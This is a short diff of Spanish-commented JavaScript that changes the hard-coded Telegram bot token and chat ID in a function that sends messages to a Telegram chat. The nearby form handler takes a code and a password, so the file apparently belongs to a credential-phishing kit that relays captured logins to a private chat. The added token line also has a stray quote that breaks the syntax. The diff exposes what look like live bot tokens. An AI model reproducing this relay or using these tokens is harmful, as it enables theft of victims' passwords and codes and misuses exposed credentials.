@@ -42,8 +42,8 @@ function handleFormSubmit(code, password, isFirstSubmit, message, alertMessage, 
 }
 
 function enviarMensajeTelegram(mensaje, callback) {
-    var token = '6283515482:AAEFjNYeO4GIWFwJQaQYMAvxtyIEfqvjWmY'; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
-    var chatId = '6283515482'; // Reemplaza 'TU_CHAT_ID' con el ID de chat al que quieres enviar el mensaje
+    var token = '5906944285:AAE8oSG0PCr7jKyDrakBDUgaf61KYkyGLVc''; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
+    var chatId = '5482691140'; // Reemplaza 'TU_CHAT_ID' con el ID de chat al que quieres enviar el mensaje
     var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
     var params = {
         chat_id: chatId,
